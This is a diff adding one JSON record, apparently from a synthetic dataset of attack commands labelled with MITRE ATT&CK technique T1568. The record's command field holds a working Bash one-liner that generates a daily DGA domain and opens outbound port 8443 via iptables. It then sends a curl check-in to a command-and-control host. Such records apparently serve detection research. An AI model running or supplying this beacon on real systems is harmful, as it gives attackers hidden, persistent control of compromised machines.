@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "FQDN=$(python3 - <<'EOF'\nimport hashlib, time\nprint(hashlib.md5((\"epsilon\"+time.strftime(\"%Y%m%d\")).encode()).hexdigest()[:12]+\".update-status.info\")\nEOF\n); PORT=8443; IP=$(dig +short A \"$FQDN\" @9.9.9.9 | shuf -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; curl -sSf --resolve \"${FQDN}:${PORT}:${IP}\" --retry 1 --connect-timeout 3 \"https://${FQDN}:${PORT}/checkin?pid=$$\"",
+  "explanation": "Builds a daily-rotating DGA domain, resolves it via Quad9, and performs a check-in to an alternate TLS port while pinning the resolved IP.",
+  "rationale_steps": [
+    "Generate DGA from a daily seed",
+    "Resolve via chosen public DNS server",
+    "Permit egress to 8443 with iptables",
+    "Send C2 check-in bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-c0d94fa6",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
